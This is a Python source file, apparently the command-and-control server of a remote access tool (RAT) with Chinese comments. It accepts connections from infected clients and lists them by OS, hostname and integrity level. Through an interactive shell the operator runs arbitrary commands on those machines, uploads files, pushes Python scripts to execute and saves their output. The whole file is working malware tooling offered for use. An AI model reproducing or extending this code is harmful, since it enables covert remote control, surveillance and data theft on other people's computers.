import glob
import inspect
import json
import re
import shlex
import socket
import subprocess
import sys
import threading
import time
import traceback
from functools import partial

try:
    import tabulate
except ImportError:
    tabulate = None
    traceback.print_exc()

from common.util import logger, parse, scan_args, get_time, format_dict, get_readable_time
from server.config import SOCKET_ADDR
from server.util import *
from common.ratsocket import RATSocket
from server.client import Client


class Server:

    def __init__(self, address):
        self.address = address
        self.socket = RATSocket()
        self.connections = []  # 存放已建立的连接
        self.aliases = {}  # 存放命令别名
        self.load_aliases()

    def serve(self):
        """
        接受新连接的线程
        """
        try:
            self.socket.bind(self.address)
            logger.info('Listening on port {}'.format(self.address[1]))
        except Exception as e:
            logger.error('Error binding socket: {}'.format(e))

        while 1:
            try:
                conn, addr = self.socket.accept()
                conn.settimeout(5)
                try:
                    connection = Client(conn)
                    info = connection.recv()
                except json.JSONDecodeError:
                    conn.close()
                    logger.error('Connection timed out: {}'.format(addr))
                    continue
                except Exception as e:
                    logger.error('Error establishing connection: {}'.format(e))
                    continue
                conn.settimeout(None)
                info = {**{'addr': f'{addr[0]}:{addr[1]}'}, **info}
                connection = Client(conn, addr, info)
                self.connections.append(connection)
                logger.info('Connection has been established: {}'.format(addr))
                threading.Thread(target=self.connection_handler, args=(connection,), daemon=True).start()  # 启动新线程处理连接
            except socket.error as e:
                logger.error(e)

    def connection_handler(self, conn):
        """
        处理接收的子线程
        :param conn: 连接
        """
        while 1:
            try:
                conn.recv_result()
            except socket.error:
                logger.error(f'Connection closed: {conn.address}')
                self.connections.remove(conn)
                break
            except:
                logger.error(f'Error receiving from {conn.address}', exc_info=True)
                time.sleep(1)

    def list_connections(self):
        """
        显示连接列表
        """
        connections = []
        for i, connection in enumerate(self.connections):
            connections.append([i, connection.info['addr'], connection.info['os'], connection.info['hostname'],
                                connection.info['integrity']])
        if tabulate:
            if connections:
                print(tabulate.tabulate(connections, headers=['ID', 'Address', 'OS', 'Hostname', 'Integrity'],
                                        tablefmt='pretty'))
        else:
            for connection in connections:
                print(connection)

    def get_last_connection(self) -> Client:
        """
        获取最新连接
        :return: 连接
        """
        try:
            return self.connections[len(self.connections) - 1]
        except IndexError:
            raise Exception('No connection at this time')

    def get_target_connection(self, id) -> Client:
        """
        根据id获取连接
        :param id: 连接id
        :return: 连接
        """
        try:
            return self.connections[int(id)]
        except (ValueError, IndexError):
            raise Exception('Not a valid selection')

    def kill_connection(self, id):
        """
        关闭连接
        :param id: 连接id
        """
        conn = self.get_target_connection(id)
        if conn:
            conn.send_command('kill')

    def open_connection(self, conn: Client):
        """
        与连接交互
        :param conn: 连接
        """
        print('[+] Connected to {}'.format(conn.address))
        conn.status = True  # 设置连接为交互中
        while not conn.queue.empty():  # 连接前判断有没有未读消息
            logger.info(conn.queue.get()[1])
        cmds = {name: getattr(Command, name) for name, func in vars(Command).items() if
                callable(getattr(Command, name))}  # 服务端命令
        try:
            while 1:
                try:
                    cmd = colored_input('{}> '.format(conn.info['cwd']))
                    if not cmd.strip():
                        continue
                    name, arg = parse(cmd)
                    # 关闭连接
                    if cmd in ['kill', 'reset']:
                        conn.send_command(cmd)
                        break
                    # 搁置连接
                    elif cmd in ['exit', 'quit']:
                        break
                    # 切换至最新连接
                    elif cmd == 'q':
                        connection = self.get_last_connection()
                        if connection == conn:
                            continue
                        self.open_connection(connection)
                        break
                    # 服务端命令
                    elif name in cmds:
                        func = partial(cmds[name], conn, arg)
                        if not inspect.isgeneratorfunction(func):  # 如果不是生成器函数
                            write(*func())  # 直接输出结果
                            continue
                    # 别名
                    elif name in self.aliases:
                        id, command = self.send_alias(conn, name, arg)  # 获取别名对应的命令并发送，返回命令id
                        func = partial(wait_for_result, conn, id, command)
                    # 发送命令
                    else:
                        id = conn.send_command(cmd)
                        func = partial(wait_for_result, conn, id, cmd)
                    if func:
                        for i in func():
                            write(*i)
                except Exception as e:
                    print_error(f'{e.__class__.__name__}: {e}')
        except socket.error:
            print_error('[-] Connection closed')
        except KeyboardInterrupt:
            print(Colors.RESET)
            time.sleep(0.1)
        except Exception as e:
            print_error(f'{e.__class__.__name__}: {e}')
        conn.status = False

    def cmdloop(self):
        """
        命令行交互
        """
        while 1:
            try:
                cmd = colored_input('flc> ')
                if not cmd.strip():
                    continue
                name, arg = parse(cmd)
                # 查看所有连接
                if cmd in ['l', 'ls', 'list']:
                    self.list_connections()
                # 与最新客户端交互
                elif cmd == 'q':
                    self.open_connection(self.get_last_connection())
                # 与指定客户端交互
                elif name in ['s', 'select']:
                    self.open_connection(self.get_target_connection(arg))
                # 关闭连接
                elif name in ['k', 'kill']:
                    self.kill_connection(arg)
                # 退出
                elif cmd in ['quit', 'exit']:
                    server.socket.close()
                    sys.exit(0)
                # 清屏
                elif cmd in ['cls', 'clear']:
                    subprocess.call(cmd, shell=True)
                # 切换目录
                elif name == 'cd':
                    print(cd(arg))
                # 与指定客户端交互
                else:
                    try:
                        self.open_connection(self.get_target_connection(cmd))
                    except Exception:
                        raise Exception('Command not recognized')
            except KeyboardInterrupt:
                print(Colors.RESET)
                server.socket.close()
                sys.exit(0)
            except Exception as e:
                write(0, f'[-] {e}')
            finally:
                print()

    def load_aliases(self):
        """
        从文件中加载命令别名
        """
        try:
            with open('server/aliases.json', 'r') as f:
                self.aliases = json.load(f)
        except:
            pass

    def save_aliases(self):
        """
        保存命令别名到文件
        :return:
        """
        with open('server/aliases.json', 'w') as f:
            json.dump(self.aliases, f)

    def send_alias(self, conn, name, arg):
        """
        发送命令别名
        :param name: 别名
        :param arg: 别名参数
        :param conn: 连接
        :return: 命令id，命令
        """
        command = self.aliases.get(name)
        # 替换参数
        regex = '<.*?>'
        provided_args = shlex.split(arg)  # 实际传入的参数
        required_args = re.findall(regex, command)  # 要求的参数
        if len(required_args) > 0:  # 如果命令要求参数
            if len(required_args) != len(provided_args):  # 如果参数个数不一致
                raise SyntaxError('number of arguments does not match')
            for arg in provided_args:
                command = re.sub(regex, arg, command, count=1)
        else:  # 命令原型中没有参数
            if len(provided_args) != 0:  # 传入了参数
                raise SyntaxError('no argument expected')
        # 发送命令
        id = conn.send_command(command)
        return id, command


class Command:

    @staticmethod
    def upload(conn, arg):
        """
        上传文件
        :param conn: 连接
        :param arg: 文件名
        """
        if os.path.isfile(arg):
            id = int(time.time())
            try:
                conn.send_file(id, arg)
                for i in wait_for_result(conn, id, 'upload ' + arg):
                    yield i
            except:
                conn.commands.queue.clear()
                raise
        else:
            raise FileNotFoundError('File does not exist')

    @staticmethod
    def exec(conn, arg):
        """
        发送python脚本
        :param conn: 连接
        :param arg: 文件名
        :return: 状态，结果
        """
        script_dir = 'server/script/'
        # 显示脚本列表
        scripts = []
        if not arg:
            for file in glob.iglob(os.path.join(script_dir, '**/*.py'), recursive=True):
                scripts.append(os.path.relpath(file, script_dir).replace('\\', '/'))
            yield 1, '\n'.join(scripts)
            return
        # 发送脚本
        arg = shlex.split(arg)  # 拆分脚本名和参数
        script_name = os.path.abspath(os.path.join(script_dir, arg[0]))  # 脚本名
        if not os.path.isfile(script_name):
            # TODO: 如果脚本名不以.py结尾自动添加
            raise FileNotFoundError(f'File does not exist: {script_name}')
        with open(script_name, 'rt') as f:
            try:
                id = conn.send_command(f.read(), type='script', extra=scan_args(arg[1:]))
            except UnicodeDecodeError:
                raise RuntimeError(f'Unprocessable file: {script_name}')
        for i in wait_for_result(conn, id):
            yield i

    @staticmethod
    def history(conn, arg):
        """
        显示历史记录
        :param conn: 连接
        :param arg: -f 显示详细信息 -c 清除记录
        :return: 状态，结果
        """
        if arg in ['-f', '--full']:
            return 1, json.dumps(conn.history, ensure_ascii=False, indent=2)
        elif arg in ['-c', '--clear']:
            conn.history.clear()
            return 1, 'History cleared'
        else:
            cmd_list = []
            for cmd in conn.history.values():
                cmd_list.append(cmd['command'])
            return 1, '\n'.join(cmd_list)

    @staticmethod
    def save_result(conn, arg):
        """
        将命令结果写入本地文件
        :param conn: 连接
        :param arg: 命令
        :return: 状态，结果
        """
        if not arg:
            return 0, ''
        id = conn.send_command(arg)
        filename = f'command_{conn.address[0]}_{get_time()}.txt'
        with open(filename, 'wt') as f:
            for i in wait_for_result(conn, id):
                f.write(i[1] + '\n')
        return 1, 'Result saved to {}'.format(filename)

    @staticmethod
    def alias(conn, arg):
        # 显示别名列表
        if not arg:
            return 1, format_dict(server.aliases)
        # 没有等号
        equal_mark_index = arg.find('=')
        if equal_mark_index == -1:
            raise SyntaxError('missing equal mark')
        # 拆分
        alias = arg[0:equal_mark_index].strip()
        cmd = arg[equal_mark_index + 1:].strip()
        # 判断是否有空值
        if not all([alias, cmd]):
            raise SyntaxError('null value not accepted')
        server.aliases[alias] = cmd
        server.save_aliases()
        return 1, f'Alias added: {alias} -> {cmd}'

    @staticmethod
    def unalias(conn, arg):
        if not arg:
            raise SyntaxError('missing alias name')
        if arg not in server.aliases:
            raise KeyError(f'alias does not exist: {arg}')
        server.aliases.pop(arg)
        server.save_aliases()
        return 1, f'Alias removed: {arg}'


def write(status: int, result: str):
    """
    在控制台输出结果
    :param status: 0或者1
    :param result: 结果
    """
    if not status:
        result = Colors.BRIGHT_RED + result + Colors.RESET
    print(result)


def wait_for_result(conn, id: int, cmd: str = None):
    """
    等待接收结果
    :param conn: 连接
    :param id: 命令id
    :param cmd: 命令
    """
    conn.commands.put(id)  # 将命令id加入待执行队列
    result_list = []  # 存放结果
    while 1:
        status, result, eof = conn.queue.get()  # 获取结果
        yield status, result  # 返回状态和结果
        result_list.append(result)  # 添加到结果列表
        if eof:  # 判断是否结束
            conn.commands.get()  # 从待执行队列移除
            break
    if cmd:
        conn.history[id] = {  # 保存到历史记录
            'command': cmd,
            'timestamp': get_readable_time(),
            'status': status,
            'result': '\n'.join(result_list),
        }


if __name__ == '__main__':
    os.system('')
    server = Server(SOCKET_ADDR)
    threading.Thread(target=server.serve, daemon=True).start()
    server.cmdloop()
